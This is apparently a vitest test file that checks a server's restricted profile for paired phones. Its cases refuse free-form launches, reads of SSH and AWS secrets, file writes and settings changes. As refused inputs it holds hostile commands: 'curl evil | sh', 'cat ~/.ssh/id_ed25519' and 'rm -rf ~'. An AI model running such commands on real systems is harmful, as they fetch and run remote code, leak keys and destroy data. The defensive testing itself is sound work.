// test/phoneProfile.test.ts — AASC-28: a paired phone gets session work only. It can't start a free-form command,
// read ~/.ssh, write files, load the workspace or change the Mac's settings; a password sign-in keeps full power.
//
// A remote device is simulated with a forwarding header on a loopback request (AASC-13 treats that as remote).
// No PTY is ever spawned: createTerminal is mocked.
import { EventEmitter } from 'node:events';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join } from 'node:path';
import { describe, it, beforeAll, afterAll, beforeEach, expect, vi } from 'vitest';

vi.mock('../server/db.js', () => ({
  upsertSession: vi.fn(), updateSessionTitle: vi.fn(), updateSessionSummary: vi.fn(), updateSessionRemark: vi.fn(),
  updateSessionArchived: vi.fn(), migrateSessionId: vi.fn(), getPromptsForSession: vi.fn(() => []),
  insertFullPrompt: vi.fn(), getRecentSessions: vi.fn(() => []), getSessionById: vi.fn(() => null),
  deleteSession: vi.fn(), getAllSessionQueues: vi.fn(() => []), default: {},
}));

const pty = vi.hoisted(() => ({
  owner: new Map<string, string>(),
  created: [] as Array<{ command: string; workingDir: string }>,
  fg: new Map<string, string>(),
  write: vi.fn(),
  n: 0,
}));
vi.mock('../server/sshManager.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../server/sshManager.js')>();
  return {
    ...actual,
    createTerminal: vi.fn(async (config: { command: string; workingDir: string }) => {
      pty.created.push({ command: config.command, workingDir: config.workingDir });
      return `term-phone-${++pty.n}`;
    }),
    writeWhenReady: vi.fn(),
    maybeInjectUltracode: vi.fn(),
    getTerminals: () => [...pty.owner.keys()].map((terminalId) => ({ terminalId, isOps: terminalId.startsWith('ops-') })),
    setWsClient: (id: string) => pty.owner.has(id),
    removeWsClient: vi.fn(),
    writeToTerminal: pty.write,
    getTerminalSessionId: (id: string) => pty.owner.get(id) ?? null,
    isOpsTerminal: (id: string) => id.startsWith('ops-'),
    getForegroundProcess: (id: string) => pty.fg.get(id) ?? null,
  };
});

import express from 'express';
import { createServer, type Server } from 'http';
import {
  phoneRuleFor, phoneLaunchRefusal, phoneMayRead, phoneProjectRoot, createPhoneProfile, isAgentProcessName,
  phoneFloatingRefusal, PHONE_UPLOADS_PER_MINUTE,
} from '../server/mobile/phoneProfile.js';
import { isQueueImageId } from '../server/queueImages.js';

// ── A home folder with a project, an unknown folder and secrets ─────────────────────────────────────────

let tmp = '';
let home = '';
let project = '';
let other = '';
let launchDir = '';
let outside = '';

beforeAll(() => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), 'aasc-phone-')));
  home = join(tmp, 'home');
  project = join(home, 'proj');
  other = join(home, 'other');
  mkdirSync(join(home, '.ssh'), { recursive: true });
  writeFileSync(join(home, '.ssh', 'id_ed25519'), 'PRIVATE');
  mkdirSync(join(project, 'src'), { recursive: true });
  mkdirSync(join(project, '.aws'), { recursive: true });
  writeFileSync(join(project, 'README.md'), '# proj');
  writeFileSync(join(project, '.aws', 'credentials'), 'KEY');
  symlinkSync(join(home, '.ssh'), join(project, 'keys'));
  mkdirSync(other, { recursive: true });
  launchDir = join(home, 'launch');
  mkdirSync(launchDir, { recursive: true });
  // Secret-looking files inside a project, agent config folders, a project
  // literally called "library", and a folder outside the home folder.
  writeFileSync(join(project, '.env'), 'TOKEN=1');
  writeFileSync(join(project, 'server.pem'), 'KEY');
  writeFileSync(join(project, 'id_ed25519'), 'KEY');
  mkdirSync(join(project, '.git'), { recursive: true });
  writeFileSync(join(project, '.git', 'config'), '[remote] url = https://token@host');
  mkdirSync(join(home, '.codex', 'proj'), { recursive: true });
  writeFileSync(join(home, '.codex', 'auth.json'), '{}');
  mkdirSync(join(home, 'Library', 'proj'), { recursive: true });
  mkdirSync(join(home, 'code', 'library'), { recursive: true });
  outside = join(tmp, 'outside');
  mkdirSync(outside, { recursive: true });
});

afterAll(() => {
  rmSync(tmp, { recursive: true, force: true });
});

// ── The route table ──────────────────────────────────────────────────────────────────────────────────────

describe('phoneRuleFor', () => {
  it.each([
    ['GET', '/sessions'], ['GET', '/config'], ['GET', '/known-projects'], ['GET', '/presence'],
    ['POST', '/presence/control/claim'], ['GET', '/sessions/abc/transcript'], ['PUT', '/sessions/abc/queue'],
    ['POST', '/sessions/abc/kill'], ['POST', '/sessions/abc/fork'], ['POST', '/sessions/abc/queue/resume'],
    ['PUT', '/sessions/abc/title'], ['GET', '/db/sessions/abc'], ['POST', '/db/sessions/abc/notes'],
    ['PUT', '/db/notes/4'], ['GET', '/note-media/abc'], ['GET', '/agenda'],
    ['GET', '/sessions/abc/queue/sent'], ['POST', '/sessions/abc/queue/sent'],
    ['GET', '/snippets'], ['POST', '/snippets'], ['PATCH', '/snippets/3'], ['DELETE', '/snippets/3'], ['POST', '/snippets/3/use'],
    ['GET', '/rooms'], ['POST', '/rooms/ops'],
  ])('lets a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBe('allow');
  });

  it('checks terminals, typing, files, commands, uploads and launches before letting them through', () => {
    expect(phoneRuleFor('GET', '/terminals/t1/output')).toBe('terminal');
    expect(phoneRuleFor('POST', '/terminals/t1/write')).toBe('type');
    expect(phoneRuleFor('GET', '/commands')).toBe('commands');
    expect(phoneRuleFor('POST', '/queue-images')).toBe('upload');
    expect(phoneRuleFor('POST', '/sessions/abc/queue/items')).toBe('upload');
    expect(phoneRuleFor('POST', '/db/sessions/abc/note-media')).toBe('upload');
    expect(phoneRuleFor('GET', '/files/read')).toBe('files');
    expect(phoneRuleFor('GET', '/files/resolve')).toBe('files');
    expect(phoneRuleFor('POST', '/terminals')).toBe('launch');
    expect(phoneRuleFor('POST', '/sessions/spawn-floating')).toBe('origin');
  });

  it.each([
    ['GET', '/workspace/load'], ['POST', '/workspace/save'], ['POST', '/workspace/restore-claim'],
    ['POST', '/files/write'], ['POST', '/files/mkdir'], ['POST', '/files/delete'],
    ['POST', '/files/reveal'], ['POST', '/files/open-external'],
    ['POST', '/hooks/install'], ['POST', '/hooks/uninstall'], ['GET', '/hooks/status'],
    ['POST', '/config/terminal-buffer'], ['POST', '/reset'], ['POST', '/hook-stats/reset'],
    ['POST', '/sessions/clear-all'], ['GET', '/ssh-keys'], ['POST', '/tmux-sessions'],
    ['POST', '/sessions/abc/reconnect-ops-terminal'], ['PUT', '/sessions/abc/remote-visible'],
    ['PUT', '/sessions/abc/pinned'], ['POST', '/sessions/abc/summarize'],
    ['GET', '/sessions/history'], ['GET', '/sessions/resume-command'], ['GET', '/sessions/spawn-floating'],
    ['POST', '/terminals/register'], ['POST', '/terminals/t1/prefill-output'],
    ['GET', '/teams/x/config'], ['POST', '/teams/x/members/y/terminal'],
    ['GET', '/db/sessions'], ['GET', '/db/search'], ['GET', '/db/projects'], ['DELETE', '/db/sessions/abc'],
    ['POST', '/snippets/import'],
    ['PUT', '/rooms'], ['GET', '/rooms/ops'], ['DELETE', '/rooms'],
    ['GET', '/a-route-added-later'],
  ])('refuses a phone %s %s', (method, path) => {
    expect(phoneRuleFor(method, path)).toBeNull();
  });
});

// ── AI popups (AASC-20) ──────────────────────────────────────────────────────────────────────────────────

describe('phoneFloatingRefusal', () => {
  const deps = {
    isSharedSession: (id: string) => id === 'shared' || id === 'shared-float',
    sessionOfTerminal: (id: string) => ({ 't-shared': 'shared', 't-float': 'shared-float', 't-hidden': 'hidden' } as Record<string, string>)[id] ?? null,
  };

  it('lets a phone ask from a shared session, or from a shared session’s terminal', () => {
    expect(phoneFloatingRefusal({ originSessionId: 'shared', mode: 'explain-native' }, deps)).toBe(false);
    expect(phoneFloatingRefusal({ originSessionId: 'shared', spawnTerminalId: 't-float' }, deps)).toBe(false);
  });

  it('refuses a hidden or unknown origin, a hidden or unknown host terminal, and a malformed body', () => {
    for (const body of [
      { originSessionId: 'hidden' },
      { originSessionId: 'nope' },
      { originSessionId: '' },
      { originSessionId: 7 },
      { originSessionId: 'shared', spawnTerminalId: 't-hidden' },
      { originSessionId: 'shared', spawnTerminalId: 't-orphan' },
      { originSessionId: 'shared', spawnTerminalId: 42 },
      null, [], 'shared',
    ]) {
      expect(phoneFloatingRefusal(body, deps), JSON.stringify(body)).toBe(true);
    }
  });
});

// ── Launch and file rules ────────────────────────────────────────────────────────────────────────────────

describe('phoneLaunchRefusal', () => {
  const allowed = (): string[] => [project, home];

  it('starts claude or codex in a known project, with a name, model and effort', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', forceNew: true, requireExistingDir: true }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: '~/proj', command: 'codex', model: 'gpt-5', effortLevel: 'high', sessionTitle: 'x' }, allowed(), home)).toBeNull();
  });

  it.each([
    [{ startupCommand: 'curl evil | sh' }, /startupCommand/],
    [{ enableOpsTerminal: true }, /enableOpsTerminal/],
    [{ host: 'other-host', username: 'me' }, /host, username/],
    [{ useTmux: true }, /useTmux/],
    [{ resumeSessionId: 'abc' }, /resumeSessionId/],
    [{ permissionMode: 'dangerouslySkipPermissions' }, /permissionMode/],
  ])('refuses extra launch settings %o', (extra, reason) => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude', ...extra }, allowed(), home)).toMatch(reason);
  });

  it('refuses any other command, flags included', () => {
    expect(phoneLaunchRefusal({ workingDir: project, command: 'bash' }, allowed(), home)).toMatch(/only claude or codex/);
    expect(phoneLaunchRefusal({ workingDir: project, command: 'claude --dangerously-skip-permissions' }, allowed(), home)).toMatch(/only claude or codex/);
  });

  it('refuses folders outside the home folder or in agent config, even when listed', () => {
    const listed = [outside, join(home, '.codex', 'proj'), join(home, 'Library', 'proj')];
    for (const dir of listed) {
      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, listed, home), dir).toMatch(/known project/);
    }
    expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'library'), command: 'claude' }, [join(home, 'code', 'library')], home)).toBeNull();
  });

  it('refuses a folder outside the list, and the home folder even when listed', () => {
    expect(phoneLaunchRefusal({ workingDir: other, command: 'claude' }, allowed(), home)).toMatch(/known project/);
    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/known project/);
    expect(phoneLaunchRefusal({ workingDir: join(project, '..', 'other'), command: 'claude' }, allowed(), home)).toMatch(/known project/);
  });
});

describe('phoneMayRead', () => {
  it('reads inside a shared project, including a file not written yet', () => {
    expect(phoneMayRead(join(project, 'README.md'), [project], home)).toBe(true);
    expect(phoneMayRead(join(project, 'src', 'new.ts'), [project], home)).toBe(true);
  });

  it('never reads outside it, through a link, or in a secrets folder', () => {
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '..', '.ssh', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, 'keys', 'id_ed25519'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '.aws', 'credentials'), [project], home)).toBe(false);
    expect(phoneMayRead('relative/path', [project], home)).toBe(false);
  });

  it('ignores case when it checks secrets folders', () => {
    expect(phoneMayRead(join(project, '.AWS', 'credentials'), [project], home)).toBe(false);
    expect(phoneMayRead(join(project, '.Aws'), [project], home)).toBe(false);
  });

  it('never reads env files, keys, certificates or git internals', () => {
    for (const name of ['.env', '.env.local', 'server.pem', 'id_ed25519', 'deploy.key', join('.git', 'config')]) {
      expect(phoneMayRead(join(project, name), [project], home), name).toBe(false);
    }
  });

  it('never serves a shared project outside the home folder or inside agent config', () => {
    expect(phoneMayRead(join(outside, 'x.txt'), [outside], home)).toBe(false);
    expect(phoneMayRead(join(home, '.codex', 'auth.json'), [join(home, '.codex')], home)).toBe(false);
    expect(phoneMayRead(join(home, '.codex', 'proj', 'a.md'), [join(home, '.codex', 'proj')], home)).toBe(false);
  });

  it('serves nothing from a session that runs in the home folder or at /', () => {
    expect(phoneProjectRoot(home, home)).toBeNull();
    expect(phoneProjectRoot('/', home)).toBeNull();
    expect(phoneMayRead(join(home, '.ssh', 'id_ed25519'), [home], home)).toBe(false);
    expect(phoneMayRead(join(home, 'proj', 'README.md'), [home], home)).toBe(false);
  });
});

// ── Through the real API router, with real session tokens ─────────────────────────────────────────────

let server: Server;
let base = '';
let store: typeof import('../server/sessionStore.js');
const PHONE: Record<string, string> = { 'X-Forwarded-For': '192.168.1.60', 'X-AASC-Client-Id': 'phone-a' };
const IPAD: Record<string, string> = { 'X-Forwarded-For': '192.168.1.61', 'X-AASC-Client-Id': 'ipad-a' };

beforeAll(async () => {
  store = await import('../server/sessionStore.js');
  const auth = await import('../server/authManager.js');
  PHONE.Authorization = `Bearer ${auth.createToken('dev-phone-a')}`;
  IPAD.Authorization = `Bearer ${auth.createToken()}`;
  const { filterVisibleSessions } = await import('../server/sessionVisibility.js');
  await store.createTerminalSession('ph-shared', { host: 'localhost', workingDir: project, command: 'claude' });
  await store.createTerminalSession('ph-hidden', { host: 'localhost', workingDir: other, command: 'claude' });
  store.setSessionRemoteVisible('ph-shared', true);
  pty.owner.set('t-shared', 'ph-shared');
  pty.owner.set('ops-shared', 'ph-shared');
  pty.owner.set('t-hidden', 'ph-hidden');

  const app = express();
  app.use(express.json());
  app.use('/api', createPhoneProfile({
    phoneOf: (req) => auth.getTokenDeviceId(auth.extractToken(req)),
    sharedProjectPaths: () => Object.values(filterVisibleSessions(false, store.getAllSessions())).map((s) => s.projectPath),
    knownProjectPaths: () => [project, other, launchDir, home],
    isOpsTerminal: (id) => id.startsWith('ops-'),
    isSharedSession: (id) => store.getSession(id)?.remoteVisible === true,
    sessionOfTerminal: (id) => pty.owner.get(id) ?? null,
    foregroundProcess: (id) => pty.fg.get(id) ?? null,
    home,
  }));
  const { default: apiRouter } = await import('../server/apiRouter.js');
  app.use('/api', apiRouter);
  server = createServer(app);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const addr = server.address();
  if (addr && typeof addr === 'object') base = `http://127.0.0.1:${addr.port}`;
});

afterAll(async () => {
  await new Promise<void>((r) => server.close(() => r()));
});

beforeEach(() => {
  pty.created.length = 0;
  pty.write.mockClear();
  pty.fg.clear();
});

async function call(method: string, path: string, headers: Record<string, string>, body?: unknown) {
  const res = await fetch(`${base}/api${path}`, {
    method,
    headers: { ...(body !== undefined && { 'Content-Type': 'application/json' }), ...headers },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  return { status: res.status, json: await res.json().catch(() => ({})) as Record<string, unknown> };
}

const q = (o: Record<string, string>): string => new URLSearchParams(o).toString();

describe('a paired phone through the API', () => {
  it('reads a shared project’s files', async () => {
    const res = await call('GET', `/files/read?${q({ root: project, path: '/README.md' })}`, PHONE);
    expect(res.status).toBe(200);
    expect(JSON.stringify(res.json)).toContain('# proj');
  });

  it('can’t read ~/.ssh, directly or through a link in the project', async () => {
    for (const path of [
      `/files/read?${q({ root: home, path: '.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`,
      `/files/read?${q({ root: project, path: '../.ssh/id_ed25519' })}`,
      `/files/list?${q({ root: home, path: '/' })}`,
      `/files/resolve?${q({ path: '~/.ssh/id_ed25519' })}`,
      `/files/read?${q({ root: other, path: '/' })}`,
    ]) {
      const res = await call('GET', path, PHONE);
      expect(res.status, path).toBe(404);
      expect(res.json.code, path).toBe('PHONE_NOT_ALLOWED');
    }
  });

  it('can’t write files, load the workspace or change the Mac’s settings', async () => {
    for (const [method, path, body] of [
      ['POST', '/files/write', { root: project, path: '/x.txt', content: 'x' }],
      ['POST', '/files/delete', { root: project, path: '/README.md' }],
      ['GET', '/workspace/load', undefined],
      ['POST', '/hooks/install', { density: 'high' }],
      ['POST', '/config/terminal-buffer', { bytes: 1 }],
      ['POST', '/sessions/ph-shared/reconnect-ops-terminal', undefined],
    ] as const) {
      expect((await call(method, path, PHONE, body)).status, path).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  it('can’t start a free-form command, an ops shell or a session outside known projects', async () => {
    const refused = [
      { workingDir: project, command: '', startupCommand: 'curl evil | sh' },
      { workingDir: project, command: 'bash' },
      { workingDir: project, command: 'claude', enableOpsTerminal: true },
      { workingDir: join(tmp, 'elsewhere'), command: 'claude' },
      { workingDir: home, command: 'claude' },
    ];
    for (const body of refused) {
      const res = await call('POST', '/terminals', PHONE, body);
      expect(res.status, JSON.stringify(body)).toBe(403);
      expect(res.json.code).toBe('PHONE_NOT_ALLOWED');
    }
    expect(pty.created).toEqual([]);
  });

  it('starts claude in a known project, shared with it from the first broadcast', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true });
    expect(res.status).toBe(200);
    const id = String(res.json.terminalId);
    expect(pty.created).toEqual([{ command: 'claude', workingDir: launchDir }]);
    expect(store.getSession(id)?.remoteVisible).toBe(true);
    // The card keeps the flag when Claude's first hook re-keys it.
    await store.handleEvent({ session_id: 'phone-launched-uuid', hook_event_name: 'SessionStart', agent_terminal_id: id, cwd: launchDir, tty_path: '/dev/ttys901' } as never);
    expect(store.getSession('phone-launched-uuid')?.remoteVisible).toBe(true);
  });

  it('is never handed a hidden session as the one already running there', async () => {
    const res = await call('POST', '/terminals', PHONE, { workingDir: other, command: 'claude' });
    expect(res.status).toBe(200);
    expect(res.json.deduplicated).toBeUndefined();
    expect(res.json.terminalId).not.toBe('ph-hidden');
  });

  it('types only while the agent is the terminal’s foreground program', async () => {
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('ipad-ws');
    pty.fg.set('t-shared', 'zsh'); // the agent exited: this is the login shell underneath
    const shell = await call('POST', '/terminals/t-shared/write', PHONE, { data: 'cat ~/.ssh/id_ed25519\r' });
    expect(shell.status).toBe(409);
    expect(shell.json.code).toBe('AGENT_NOT_RUNNING');
    pty.fg.delete('t-shared'); // unknown counts as not running
    expect((await call('POST', '/terminals/t-shared/write', PHONE, { data: 'x' })).status).toBe(409);
    expect(pty.write).not.toHaveBeenCalled();
    pty.fg.set('t-shared', 'claude');
    expect((await call('POST', '/terminals/t-shared/write', PHONE, { data: 'hi' })).status).toBe(200);
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hi');
  });

  it('reads the autocomplete catalog only for a shared project', async () => {
    expect((await call('GET', `/commands?${q({ cli: 'claude', projectPath: join(home, 'code', 'library') })}`, PHONE)).status).toBe(404);
    expect((await call('GET', `/commands?${q({ cli: 'claude', projectPath: project })}`, PHONE)).json.code).not.toBe('PHONE_NOT_ALLOWED');
  });

  it('can’t widen a search with a glob', async () => {
    const res = await call('GET', `/files/grep?${q({ root: project, q: 'KEY', glob: '.aws/**' })}`, PHONE);
    expect(res.status).toBe(404);
  });

  it('sees the forks it asks for', async () => {
    const res = await call('POST', '/sessions/ph-shared/fork', PHONE, {});
    expect(res.status).toBe(200);
    expect(store.getSession(String(res.json.terminalId))?.remoteVisible).toBe(true);
  });

  it('starts an AI popup from a shared session, shared with it (AASC-20)', async () => {
    const res = await call('POST', '/sessions/spawn-floating', PHONE, {
      originSessionId: 'ph-shared', spawnTerminalId: 't-shared', mode: 'explain-native',
      selection: 'what does this do', nativeLanguage: 'English', learningLanguage: 'English',
    });
    expect(res.status).toBe(200);
    const id = String(res.json.terminalId);
    expect(pty.created).toHaveLength(1);
    expect(pty.created[0].command).toBe('');
    expect(store.getSession(id)?.remoteVisible).toBe(true);
    expect(store.getSession(id)?.isFloating).toBe(true);
  });

  it('never starts an AI popup from a hidden session or a hidden session’s terminal', async () => {
    for (const body of [
      { originSessionId: 'ph-hidden' },
      { originSessionId: 'no-such-session' },
      { originSessionId: 'ph-shared', spawnTerminalId: 't-hidden' },
    ]) {
      const res = await call('POST', '/sessions/spawn-floating', PHONE, {
        ...body, mode: 'explain-native', selection: 'x', nativeLanguage: 'English', learningLanguage: 'English',
      });
      expect(res.status, JSON.stringify(body)).toBe(404);
    }
    expect(pty.created).toEqual([]);
  });

  it('still can’t reach the other fixed /sessions routes', async () => {
    expect((await call('POST', '/sessions/clear-all', PHONE, {})).status).toBe(404);
    expect((await call('GET', '/sessions/history', PHONE)).status).toBe(404);
    expect((await call('GET', `/sessions/resume-command?${q({ path: project })}`, PHONE)).status).toBe(404);
    expect(store.getSession('ph-shared')).toBeDefined();
  });

  it('reads the Mac’s rooms and asks for changes, but never sets the list (AASC-20)', async () => {
    // The Mac (local, no device connected yet so any local caller is the writer) pushes its list.
    const rooms = [
      { id: 'r-mixed', name: 'Mixed', sessionIds: ['ph-shared', 'ph-hidden'], collapsed: false, createdAt: 1, roomIndex: 0 },
      { id: 'r-secret', name: 'Secret', sessionIds: ['ph-hidden'], collapsed: false, createdAt: 1, roomIndex: 1 },
    ];
    expect((await call('PUT', '/rooms', {}, { rooms })).status).toBe(200);

    const read = await call('GET', '/rooms', PHONE);
    expect(read.status).toBe(200);
    expect(read.json.rooms).toEqual([{ ...rooms[0], sessionIds: ['ph-shared'] }]);

    const set = await call('PUT', '/rooms', PHONE, { rooms: [] });
    expect(set.status).toBe(404);
    expect(set.json.code).toBe('PHONE_NOT_ALLOWED');

    // Through the profile to the rooms router, whose own visibility checks still run.
    const hidden = await call('POST', '/rooms/ops', PHONE, { type: 'move', sessionId: 'ph-hidden', roomId: null });
    expect(hidden.status).toBe(404);
    expect(hidden.json.code).toBeUndefined();
    // No Mac window is connected to apply a change.
    const noWriter = await call('POST', '/rooms/ops', PHONE, { type: 'move', sessionId: 'ph-shared', roomId: null });
    expect(noWriter.status).toBe(409);
    expect(noWriter.json.error).toBe('no-writer');
  });

  it('has an upload budget per minute', async () => {
    const codes: number[] = [];
    for (let i = 0; i <= PHONE_UPLOADS_PER_MINUTE; i++) {
      codes.push((await call('POST', '/queue-images', PHONE, { images: [] })).status);
    }
    expect(codes.slice(0, PHONE_UPLOADS_PER_MINUTE).every((c) => c === 200)).toBe(true);
    expect(codes[PHONE_UPLOADS_PER_MINUTE]).toBe(429);
  });

  it('can’t type into or watch an ops shell, but drives the agent terminal', async () => {
    pty.fg.set('t-shared', 'claude');
    pty.fg.set('ops-shared', 'zsh');
    expect((await call('POST', '/terminals/ops-shared/write', PHONE, { data: 'cat ~/.ssh/id_ed25519\r' })).status).toBe(404);
    expect((await call('GET', '/terminals/ops-shared/output', PHONE)).status).toBe(404);
    expect(pty.write).not.toHaveBeenCalled();
    const res = await call('POST', '/terminals/t-shared/write', PHONE, { data: 'hi' });
    expect(res.status).toBe(200);
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hi');
  });
});

describe('a password sign-in keeps the dashboard’s full power', () => {
  it('passes the profile untouched', async () => {
    const res = await call('POST', '/terminals', IPAD, { workingDir: other, command: 'bash', forceNew: true });
    expect(res.status).toBe(200);
    expect(pty.created).toEqual([{ command: 'bash', workingDir: other }]);
    expect((await call('GET', `/files/read?${q({ root: project, path: 'keys/id_ed25519' })}`, IPAD)).status).toBe(200);
  });

  it('gets an id for each uploaded image, which a prompt sent through the Mac names it by (AASC-42)', async () => {
    const res = await call('POST', '/queue-images', IPAD, { images: [{ name: 'a.png', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' }] });
    const paths = res.json.paths as string[];
    try {
      expect(paths).toHaveLength(1);
      expect(res.json.ids).toEqual(paths.map((p) => basename(p)));
      expect((res.json.ids as string[]).every(isQueueImageId)).toBe(true);
    } finally {
      for (const p of paths) rmSync(p, { force: true });
    }
  });
});

// ── The live connection ──────────────────────────────────────────────────────────────────────────────────

class FakeSocket extends EventEmitter {
  readyState = 1;
  bufferedAmount = 0;
  sent: Array<Record<string, unknown>> = [];
  send = vi.fn((raw: string) => { this.sent.push(JSON.parse(raw) as Record<string, unknown>); });
  ping = vi.fn();
  terminate = vi.fn();
  close = vi.fn();
  say(msg: Record<string, unknown>): void { this.emit('message', Buffer.from(JSON.stringify(msg))); }
}

describe('isAgentProcessName', () => {
  it('knows the agents and treats shells and unknowns as not running', () => {
    expect(['claude', 'codex', 'node', 'Claude'].every(isAgentProcessName)).toBe(true);
    expect(['zsh', 'bash', 'sh', 'vim', 'ssh', 'tmux', '', null, undefined].some(isAgentProcessName)).toBe(false);
  });
});

describe('ops shells on the live connection', () => {
  it('a phone can’t subscribe or type to an ops shell; a password sign-in still can', async () => {
    const ws = await import('../server/wsManager.js');
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('phone-a'); // the HTTP tests above left the phone holding the baton
    const phone = new FakeSocket();
    ws.handleConnection(phone as never, { clientId: 'phone-ws', label: 'Phone', address: '192.168.1.60', isLocal: false, lineage: 'lp', deviceId: 'dev-phone-a' });
    phone.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    phone.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).not.toHaveBeenCalled();

    const ipad = new FakeSocket();
    ws.handleConnection(ipad as never, { clientId: 'ipad-ws', label: 'iPad', address: '192.168.1.61', isLocal: false, lineage: 'li' });
    ipad.say({ type: 'terminal_subscribe', terminalId: 'ops-shared' });
    ipad.say({ type: 'terminal_input', terminalId: 'ops-shared', data: 'id\r' });
    expect(pty.write).toHaveBeenCalledWith('ops-shared', 'id\r');
    phone.emit('close');
    ipad.emit('close');
  });

  it('a phone types into the agent terminal only while the agent runs, and is told why not', async () => {
    const ws = await import('../server/wsManager.js');
    const presence = await import('../server/presenceManager.js');
    presence.releaseAllControls('ipad-ws');
    presence.releaseAllControls('phone-a');
    const phone = new FakeSocket();
    ws.handleConnection(phone as never, { clientId: 'phone-ws2', label: 'Phone', address: '192.168.1.60', isLocal: false, lineage: 'lp2', deviceId: 'dev-phone-a' });
    phone.say({ type: 'terminal_subscribe', terminalId: 't-shared' });
    pty.fg.set('t-shared', 'zsh');
    phone.say({ type: 'terminal_input', terminalId: 't-shared', data: 'rm -rf ~\r' });
    expect(pty.write).not.toHaveBeenCalled();
    expect(phone.sent.some((m) => m.type === 'terminal_error' && /only while the agent is running/.test(String(m.error)))).toBe(true);
    pty.fg.set('t-shared', 'claude');
    phone.say({ type: 'terminal_input', terminalId: 't-shared', data: 'hello' });
    expect(pty.write).toHaveBeenCalledWith('t-shared', 'hello');
    phone.emit('close');
  });
});
